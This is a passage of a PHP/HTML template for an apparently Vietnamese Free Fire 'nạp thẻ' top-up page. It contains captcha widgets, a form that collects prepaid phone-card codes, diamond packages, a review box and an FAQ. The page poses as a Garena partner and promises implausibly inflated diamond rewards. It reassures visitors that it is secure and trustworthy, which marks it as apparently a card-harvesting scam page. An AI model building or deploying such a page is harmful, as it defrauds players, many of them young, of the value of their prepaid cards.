                                                         <div id="slider_handle" style="position: absolute; left: 0; top: 0; width: 40px; height: 40px; background: #f97316; border-radius: 50%; cursor: grab; display: flex; align-items: center; justify-content: center; box-shadow: 0px 2px 5px rgba(0,0,0,0.3); z-index: 15; transition: background 0.2s;">
                                                             <i class="fas fa-arrows-alt-h" style="color: white; font-size: 14px;"></i>
                                                         </div>
                                                     </div>
                                                     <input type="hidden" id="puzzle_offset" value="0" />
                                                 </div>
                                             </div>
                                             
                                             <script>
                                             document.addEventListener("DOMContentLoaded", function() {
                                                 loadPuzzleCaptcha();
                                                 
                                                 var handle = document.getElementById("slider_handle");
                                                 var track = document.getElementById("slider_track");
                                                 var piece = document.getElementById("puzzle_piece");
                                                 var offsetInput = document.getElementById("puzzle_offset");
                                                 var isDragging = false;
                                                 var startX = 0;
                                                 var maxLeft = 220; // 260 width - 40 handle width
                                                 
                                                 handle.addEventListener("mousedown", startDrag);
                                                 handle.addEventListener("touchstart", startDrag, { passive: true });
                                                 
                                                 function startDrag(e) {
                                                     isDragging = true;
                                                     handle.style.cursor = "grabbing";
                                                     startX = (e.type === "touchstart") ? e.touches[0].clientX : e.clientX;
                                                     
                                                     window.addEventListener("mousemove", drag);
                                                     window.addEventListener("touchmove", drag, { passive: false });
                                                     window.addEventListener("mouseup", stopDrag);
                                                     window.addEventListener("touchend", stopDrag);
                                                 }
                                                 
                                                 function drag(e) {
                                                     if (!isDragging) return;
                                                     if (e.type === "touchmove") e.preventDefault(); // Ngăn cuộn trang trên mobile
                                                     
                                                     var clientX = (e.type === "touchmove") ? e.touches[0].clientX : e.clientX;
                                                     var deltaX = clientX - startX;
                                                     var left = Math.min(Math.max(0, deltaX), maxLeft);
                                                     
                                                     handle.style.left = left + "px";
                                                     piece.style.left = left + "px";
                                                     offsetInput.value = Math.round(left);
                                                 }
                                                 
                                                 function stopDrag() {
                                                     if (!isDragging) return;
                                                     isDragging = false;
                                                     handle.style.cursor = "grab";
                                                     
                                                     window.removeEventListener("mousemove", drag);
                                                     window.removeEventListener("touchmove", drag);
                                                     window.removeEventListener("mouseup", stopDrag);
                                                     window.removeEventListener("touchend", stopDrag);

                                                     // Gửi request POST xác thực vị trí mảnh ghép tức thời
                                                     var xhr = new XMLHttpRequest();
                                                     xhr.open("POST", "captcha_puzzle.php", true);
                                                     xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                                                     xhr.onload = function() {
                                                         if (xhr.status === 200) {
                                                             var res = JSON.parse(xhr.responseText);
                                                             if (res.status === 'success') {
                                                                 // Xác thực đúng: khóa kéo, đổi sang màu xanh lá
                                                                 track.style.background = "#15803d";
                                                                 track.style.borderColor = "#22c55e";
                                                                 handle.style.background = "#22c55e";
                                                                 document.getElementById("slider_text").innerText = "Xác thực thành công!";
                                                                 document.getElementById("slider_text").style.color = "#ffffff";
                                                                 handle.removeEventListener("mousedown", startDrag);
                                                                 handle.removeEventListener("touchstart", startDrag);
                                                             } else {
                                                                 // Xác thực sai: đổi màu đỏ cảnh báo, sau đó tự động reload ảnh mới
                                                                 track.style.background = "#991b1b";
                                                                 track.style.borderColor = "#ef4444";
                                                                 handle.style.background = "#ef4444";
                                                                 document.getElementById("slider_text").innerText = "Sai vị trí! Đang tải lại...";
                                                                 document.getElementById("slider_text").style.color = "#ffffff";
                                                                 setTimeout(function() {
                                                                     loadPuzzleCaptcha();
                                                                     // Reset màu sắc
                                                                     track.style.background = "#1e293b";
                                                                     track.style.borderColor = "#475569";
                                                                     handle.style.background = "#f97316";
                                                                     document.getElementById("slider_text").innerText = "Kéo để ghép hình";
                                                                     document.getElementById("slider_text").style.color = "#94a3b8";
                                                                 }, 1000);
                                                             }
                                                         }
                                                     };
                                                     xhr.send("offset=" + encodeURIComponent(offsetInput.value));
                                                 }
                                             });
                                             
                                             function base64ToBlob(base64, mimeType) {
                                                 var parts = base64.split(',');
                                                 var byteCharacters = atob(parts[1]);
                                                 var byteNumbers = new Array(byteCharacters.length);
                                                 for (var i = 0; i < byteCharacters.length; i++) {
                                                     byteNumbers[i] = byteCharacters.charCodeAt(i);
                                                 }
                                                 var byteArray = new Uint8Array(byteNumbers);
                                                 return new Blob([byteArray], {type: mimeType});
                                             }

                                             function loadPuzzleCaptcha() {
                                                 var xhr = new XMLHttpRequest();
                                                 xhr.open("GET", "captcha_puzzle.php", true);
                                                 xhr.onload = function() {
                                                     if (xhr.status === 200) {
                                                         var data = JSON.parse(xhr.responseText);
                                                         
                                                         // Chuyển đổi base64 sang Blob Object URL để hiển thị ảnh an toàn
                                                         var bgBlob = base64ToBlob(data.bg, 'image/png');
                                                         var pieceBlob = base64ToBlob(data.piece, 'image/png');
                                                         
                                                         document.getElementById("puzzle_bg").src = URL.createObjectURL(bgBlob);
                                                         document.getElementById("puzzle_piece").src = URL.createObjectURL(pieceBlob);
                                                         document.getElementById("puzzle_piece").style.top = data.y + "px";
                                                         document.getElementById("puzzle_piece").style.left = "0px";
                                                         document.getElementById("slider_handle").style.left = "0px";
                                                         document.getElementById("puzzle_offset").value = "0";
                                                     }
                                                 };
                                                 xhr.send();
                                             }
                                             </script>
                                             <?php endif; ?>

                                             <!-- Captcha dạng ảnh -->
                                             <?php if ($CMSNT->site('enable_image_captcha') == 1): ?>
                                             <div class="form-group" style="margin-bottom: 15px;">
                                                 <label class="c-grey block text-sm font-medium mb-1">Mã xác nhận bằng ảnh:</label>
                                                 <div style="display: flex; gap: 10px; align-items: center;">
                                                     <img src="captcha_image.php" id="img_captcha_src" onclick="this.src='captcha_image.php?t='+new Date().getTime()" title="Click để đổi mã khác" style="cursor: pointer; border-radius: 4px; border: 1px solid #475569;" height="40">
                                                     <input type="text" id="image_captcha" class="form-input-id form-control" placeholder="Nhập mã chữ/số" style="flex: 1; text-transform: lowercase; width: 100%;" required>
                                                 </div>
                                             </div>
                                             <?php endif; ?>

                                             <!-- Captcha dạng tính toán -->
                                             <?php if ($CMSNT->site('enable_math_captcha') == 1): 
                                                 $_SESSION['math_captcha_num1'] = rand(1, 9);
                                                 $_SESSION['math_captcha_num2'] = rand(1, 9);
                                                 $_SESSION['math_captcha_answer'] = $_SESSION['math_captcha_num1'] + $_SESSION['math_captcha_num2'];
                                             ?>
                                             <div class="form-group" style="margin-bottom: 15px;">
                                                 <label class="c-grey block text-sm font-medium mb-1">Xác nhận phép tính:</label>
                                                 <div style="display: flex; gap: 10px; align-items: center;">
                                                     <span style="font-size: 18px; font-weight: bold; color: #f8fafc; background: #334155; padding: 6px 15px; border-radius: 4px; border: 1px solid #475569; display: inline-block; white-space: nowrap;">
                                                         <?= $_SESSION['math_captcha_num1'] ?> + <?= $_SESSION['math_captcha_num2'] ?> = ?
                                                     </span>
                                                     <input type="number" id="math_captcha" class="form-input-id form-control" placeholder="Đáp án" style="flex: 1; width: 100%;" required>
                                                 </div>
                                             </div>
                                             <?php endif; ?>

                                            <div class="cf-turnstile" data-sitekey="<?= $client_key_cf ?>"></div>

                                            <button onclick="sendCard(this)" class="btn-up-orange pay-step"
                                                style="width: 100%;">THANH TOÁN</button>

                                    </div>


                                    <style>
                                        .bottombar-outter-container {
                                            display: none;
                                        }
                                    </style>

                                    <div class="payment-step-container">
                                        <div class="payment-caption-container">
                                            <div class="payment-step-bullet">
                                                <b>2</b>
                                            </div>
                                            <div class="h5 payment-caption c-grey">
                                                <b>Gói nạp Kim Cương 💎</b>
                                            </div>
                                        </div>
                                        <div id="game-denoms" class="payment-denom-container c-grey">

                                            <div data-mh="same-height-group-1" class="payment-denom-button"
                                                data-id="1314">




                                                <span class="payment-denom-currency">
                                                    <b>20.000 VND<br>
                                                        💎
                                                        <font size="3">113</font><br>+<font size="2">X1</font><br>
                                                        <font color="#ed6c27">Kim Cương</font>
                                                    </b>
                                                </span>
                                            </div>

                                            <div data-mh="same-height-group-1" class="payment-denom-button"
                                                data-id="1314">




                                                <span class="payment-denom-currency">
                                                    <b>50.000 VND<br>
                                                        💎
                                                        <font size="3">1.132</font><br>+<font size="2">X2</font><br>
                                                        <font color="#ed6c27">Kim Cương</font>
                                                    </b>
                                                </span>
                                            </div>

                                            <div data-mh="same-height-group-1" class="payment-denom-button"
                                                data-id="1315">




                                                <span class="payment-denom-currency">
                                                    <b>100.000 VND<br>
                                                        💎
                                                        <font size="3">2.750</font><br>+<font size="2">X3</font><br>
                                                        <font color="#ed6c27">Kim Cương</font>
                                                    </b>
                                                </span>
                                            </div>

                                            <div data-mh="same-height-group-1" class="payment-denom-button"
                                                data-id="1316">




                                                <span class="payment-denom-currency">
                                                    <b>200.000 VND<br>
                                                        💎
                                                        <font size="3"> 19.990 </font><br>+<font size="2"> X10</font>
                                                        <br>
                                                        <font color="#ed6c27">Kim Cương</font>
                                                    </b>
                                                </span>
                                            </div>
                                            <div data-mh="same-height-group-1" class="payment-denom-button"
                                                data-id="1319">




                                                <span class="payment-denom-currency">
                                                    <b>500.000 VND<br>
                                                        💎
                                                        <font size="3"> 45.000 </font><br>+<font size="2"> X10</font>
                                                        <br>
                                                        <font color="#ed6c27">Kim Cương</font>
                                                    </b>
                                                </span>
                                            </div>
                                            <div data-mh="same-height-group-1" class="payment-denom-button"
                                                data-id="1320">




                                                <span class="payment-denom-currency">
                                                    <b>1.000.000 VND<br>
                                                        💎
                                                        <font size="3">69.050 </font><br>+<font size="2"> X10</font>
                                                        <br>
                                                        <font color="#ed6c27">Kim Cương</font>
                                                    </b>
                                                </span>
                                            </div>
                                        </div>
                                        <br>
                                        <p class="c-grey">
                                            <font color="red">*</font> Ưu Đãi <b>
                                                <font color="#ed6c27">+20%</font>
                                            </b> giá trị Kim Cương khi thanh toán bằng thẻ <b>
                                                <font color="#ed6c27">VIETTEL</font>
                                            </b>
                                        </p>
                                        <p><img src="/images/pay-methods.webp" width="70%" alt="images">
                                            <img src="images/icon_ppc_0.webp" width="30%" alt="images2">
                                        </p>

                                    </div>
                                    <table class="table pc_only table-bordered blueTable" id="table_auto">
                                        <thead>
                                            <tr
                                                style="background:-webkit-gradient(linear, 0% 0%, 100% 0%, from(#e5c322), to(#ac0b10));color:#fff;">
                                                <th>ID Game</th>
                                                <th>Trạng Thái</th>
                                                <th>Thời Gian</th>
                                            </tr>
                                        </thead>
                                        <tbody id="history_body">
                                        </tbody>
                                    </table>


                                    </div-->
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
        </div>
    </div>
    </div>
    </main>
    <div class="modal-body"></div>
    </div>
    </div>
    </div>
    </div>

    <style>
        .text-center {
            text-align: center;
        }
    </style>
    <div class="text-center">
        <h1>ĐÁNH GIÁ TỪ TRẢI NGHIỆM KHÁCH HÀNG</h1>
        <div id="contentnap"
            style="margin: 0; padding: 0; border: 0; outline: 0; list-style: none; font-family: Roboto, sans-serif; font-size: 14px;">

            <p style="color: #333; margin: 0; padding: 0;">
                <strong style="font-weight: bolder;">★ Các bình luận của các bạn sẽ được chúng tôi ghi nhận ★ </strong>
            </p>
        </div>

    </div>
    <p style="text-align: center; color: #ff0000; font-size: 18px; font-family: Roboto; margin: 0; padding: 0;">
        Quà tặng và sẽ được gửi thẳng vào tài khoản thông qua việc nạp thẻ qua ID ingame! Chúc các bạn chơi game vui vẻ.
        ^^
    </p>

    <hr>

    <div id="contentnap"
        style="margin: 0px; padding: 0px; border: 0px; outline: 0px; list-style: none; color: rgb(51, 51, 51); font-family: Roboto, sans-serif; font-size: 14px;">
        <span style="margin: 0px; padding: 0px;"><span style="margin: 0px; padding: 0px;">
                <li style="margin: 0px; padding: 0px; border: 0px; outline: 0px; list-style: none;">
            </span>


    </div>
    <div class="inbox_chat">
        <div class="wrapper-chat-list">
            <div class="chat_list">
                <div class="chat_people">
                    <div class="chat_img"></div>
                    <div class="chat_ib">
                        <h5><b>CỘNG TÁC VIÊN GARENA</b></h5>
                        <p> Các Bạn Xong Để Lại Comment Ý Kiến Của Mình Về Shop Để Tiếp Tục Phát Triển Nhé.</p>
                    </div>
                </div>
            </div>
        </div>
        <div class="messaging">
            <div class="inbox_msg">
                <div class="inbox_people">
                    <div class="headind_srch">

                    </div>
                    <div class="inbox_chat">
                        <div class="wrapper-chat-list">

                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="mesgs">
            <div class="msg_history" style="display: none">
                <div class="incoming_msg">
                    <div class="wrapper-msg-list">
                    </div>
                </div>
            </div>
            <div class="type_msg">
                <div class="input_msg_write">
                    <input type="text" class="write_msg" placeholder="Gửi nhận xét" onclick="openLink();">
                    <button class="msg_send_btn" type="button">+</button>
                </div>
            </div>
        </div>
    </div>
    </div>
    </div>
    </div>
    <div class="col-lg-12">
        <div style="text-align:center" class="history-buy-js">


        </div>
    </div>
    </div>













    </div>





    <Br /><Br />
    </div>
    </div>

    </div>
    <section id="faq" class="faq-section">
        <div class="container">
            <h2 style="font-size:20px;margin:0 0 12px">Câu hỏi thường gặp – Nạp thẻ Free Fire (FF)</h2>

            <div class="faq-item">
                <button class="faq-q" aria-expanded="false" aria-controls="a1">Nạp thẻ FF xong bao lâu nhận Kim
                    Cương?</button>
                <div id="a1" class="faq-a" hidden>Thường 1–2 phút sau thanh toán. Cao điểm có thể 5–10 phút.</div>
            </div>

            <div class="faq-item">
                <button class="faq-q" aria-expanded="false" aria-controls="a2">Nạp FF bằng thẻ
                    Viettel/Mobifone/Vinaphone được không?</button>
                <div id="a2" class="faq-a" hidden>Có. Hỗ trợ Viettel, Mobifone, Vinaphone, Vietnamobile. Chọn đúng nhà
                    mạng và mệnh giá.</div>
            </div>

            <div class="faq-item">
                <button class="faq-q" aria-expanded="false" aria-controls="a3">Nhập sai mã thẻ/seri thì sao?</button>
                <div id="a3" class="faq-a" hidden>Hệ thống báo lỗi, không trừ tiền. Kiểm tra lại hoặc liên hệ hỗ trợ.
                </div>
            </div>

            <div class="faq-item">
                <button class="faq-q" aria-expanded="false" aria-controls="a4">Có khuyến mãi nạp thẻ Free Fire
                    không?</button>
                <div id="a4" class="faq-a" hidden>Có theo thời điểm (ví dụ +20% Viettel). Xem chi tiết ở mục gói nạp.
                </div>
            </div>

            <div class="faq-item">
                <button class="faq-q" aria-expanded="false" aria-controls="a5">Dịch vụ có an toàn và uy tín?</button>
                <div id="a5" class="faq-a" hidden>Thanh toán bảo mật, xác thực Cloudflare, không yêu cầu mật khẩu/OTP.
                </div>
            </div>

            <div class="faq-item">
                <button class="faq-q" aria-expanded="false" aria-controls="a6">Cần hỗ trợ khi gặp sự cố?</button>
                <div id="a6" class="faq-a" hidden>Liên hệ Zalo/Fanpage ở footer. Cung cấp ID game, thời gian, mệnh giá
                    để xử lý nhanh.</div>
            </div>
        </div>
    </section>

    <style>
        .faq-section {
            padding: 24px 0;
            border-top: 1px solid #e5e7eb
        }

        .faq-item {
            border-bottom: 1px dashed #e5e7eb
        }

        .faq-q {
            width: 100%;
            text-align: left;
            padding: 12px 0;
            background: transparent;
            border: 0;
            cursor: pointer;
            font-weight: 600
        }

        .faq-a {
            padding: 0 0 12px;
            color: #334155
        }

        .faq-q:focus {
            outline: 2px solid #3b82f6;
            outline-offset: 2px
        }
    </style>
    <script>
        document.querySelectorAll('.faq-q').forEach(btn => {
            btn.addEventListener('click', () => {
                const expanded = btn.getAttribute('aria-expanded') === 'true';
                btn.setAttribute('aria-expanded', String(!expanded));
                const target = document.getElementById(btn.getAttribute('aria-controls'));
                if (target) { target.hidden = expanded; }
            });
        });
    </script>


    <?php
    require_once('footer.php');
    ?>